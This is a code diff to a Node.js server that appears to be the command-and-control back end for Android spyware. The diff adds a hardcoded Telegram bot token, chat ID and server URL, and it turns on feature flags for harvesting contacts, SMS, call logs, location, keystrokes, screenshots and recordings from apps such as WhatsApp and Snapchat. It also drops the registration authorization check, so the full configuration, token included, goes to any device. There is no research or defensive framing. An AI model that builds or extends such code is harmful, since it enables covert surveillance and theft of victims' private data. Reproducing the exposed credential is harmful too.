@@ -44,6 +44,68 @@ if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir, { recursive: true });
 }
 
+// ============= DEVICE CONFIGURATION =============
+// Device configurations - can be stored in a database or JSON file
+const deviceConfigs = {
+    // Default device config for all devices
+    'default': {
+        chatId: '5326373447',
+        config: {
+            chatId: '5326373447',
+            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
+            serverUrl: 'https://edu-hwpy.onrender.com',
+            pollingInterval: 15000,
+            keepAliveInterval: 300000,
+            realtimeLogging: false,
+            autoScreenshot: true,
+            autoRecording: true,
+            screenshotQuality: 70,
+            recordingQuality: 'MEDIUM',
+            appOpenBatchSize: 50,
+            syncBatchSize: 20,
+            targetApps: [
+                'com.whatsapp',
+                'com.instagram.android',
+                'com.facebook.katana',
+                'com.snapchat.android',
+                'com.google.android.youtube',
+                'com.google.android.apps.maps',
+                'org.telegram.messenger'
+            ],
+            features: {
+                contacts: true,
+                sms: true,
+                callLogs: true,
+                location: true,
+                screenshots: true,
+                recordings: true,
+                keystrokes: true,
+                notifications: true,
+                appOpens: true,
+                ipInfo: true,
+                phoneInfo: true,
+                wifiInfo: true,
+                mobileInfo: true,
+                simInfo: true
+            }
+        }
+    },
+    
+    // You can add specific device configs by device ID
+    // 'specific_device_id_here': {
+    //     chatId: 'another_chat_id',
+    //     config: {
+    //         // custom config for this device
+    //     }
+    // }
+};
+
+// Function to get device configuration
+function getDeviceConfig(deviceId) {
+    // Return device-specific config if exists, otherwise return default
+    return deviceConfigs[deviceId] || deviceConfigs['default'];
+}
+
 // ============= FILE UPLOAD CONFIGURATION =============
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
@@ -1865,18 +1927,21 @@ app.post('/api/result/:deviceId', async (req, res) => {
     res.sendStatus(200);
 });
 
+// ============= UPDATED REGISTRATION ENDPOINT =============
 app.post('/api/register', async (req, res) => {
-    const { deviceId, chatId, deviceInfo } = req.body;
+    const { deviceId, deviceInfo } = req.body;
     
-    console.log('📝 Registration attempt:', { deviceId, chatId });
+    console.log('📝 Registration attempt:', { deviceId });
     
-    if (!deviceId || !chatId || !deviceInfo) {
+    if (!deviceId || !deviceInfo) {
         return res.status(400).json({ error: 'Missing fields' });
     }
     
-    if (!isAuthorizedChat(chatId)) {
-        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
-        return res.status(403).json({ error: 'Chat ID not authorized' });
+    // Get device configuration (maps device to chat ID and config)
+    const deviceConfig = getDeviceConfig(deviceId);
+    
+    if (!deviceConfig) {
+        return res.status(403).json({ error: 'Device not authorized' });
     }
     
     // Check if device already exists
@@ -1884,10 +1949,10 @@ app.post('/api/register', async (req, res) => {
     const isNewDevice = !existingDevice;
     
     const deviceData = {
-        chatId,
+        chatId: deviceConfig.chatId,
         deviceInfo,
         lastSeen: Date.now(),
-        pendingCommands: [],
+        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
         firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
         phoneNumber: existingDevice?.phoneNumber || null,
         lastIPInfo: existingDevice?.lastIPInfo || null,
@@ -1899,12 +1964,13 @@ app.post('/api/register', async (req, res) => {
     
     devices.set(deviceId, deviceData);
     
-    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${chatId}`);
+    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
     
-    await setChatMenuButton(chatId);
+    // Set menu button for the chat
+    await setChatMenuButton(deviceConfig.chatId);
     
     // Get device count for this user
-    const userDevices = getDeviceListForUser(chatId);
+    const userDevices = getDeviceListForUser(deviceConfig.chatId);
     
     let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
     welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
@@ -1929,7 +1995,7 @@ app.post('/api/register', async (req, res) => {
         
         // Auto-select this device if it's the only one
         if (userDevices.length === 1) {
-            userDeviceSelection.set(chatId, deviceId);
+            userDeviceSelection.set(deviceConfig.chatId, deviceId);
             welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
         }
     } else {
@@ -1937,16 +2003,23 @@ app.post('/api/register', async (req, res) => {
     }
     
     await sendTelegramMessageWithKeyboard(
-        chatId,
+        deviceConfig.chatId,
         welcomeMessage,
-        getMainMenuKeyboard(chatId)
+        getMainMenuKeyboard(deviceConfig.chatId)
     );
     
+    // Queue auto-data commands for new devices
     if (isNewDevice) {
-        queueAutoDataCommands(deviceId, chatId);
+        queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
-    res.json({ status: 'registered', deviceId, isNew: isNewDevice });
+    // Return configuration to the device
+    res.json({
+        status: 'registered',
+        deviceId,
+        chatId: deviceConfig.chatId,
+        config: deviceConfig.config // Send the full configuration
+    });
 });
 
 app.get('/api/devices', (req, res) => {
@@ -2061,6 +2134,11 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log('\n✅ DEVICE CONFIGURATION SYSTEM:');
+    console.log('   └─ Each device gets its own configuration');
+    console.log('   └─ Config includes bot token, chat ID, feature flags');
+    console.log('   └─ Default config for all devices');
+    console.log('   └─ Can override per device ID');
     console.log('\n✅ MULTI-DEVICE SUPPORT ENABLED:');
     console.log('   └─ /devices - List all devices');
     console.log('   └─ /select [device_id] - Switch active device');
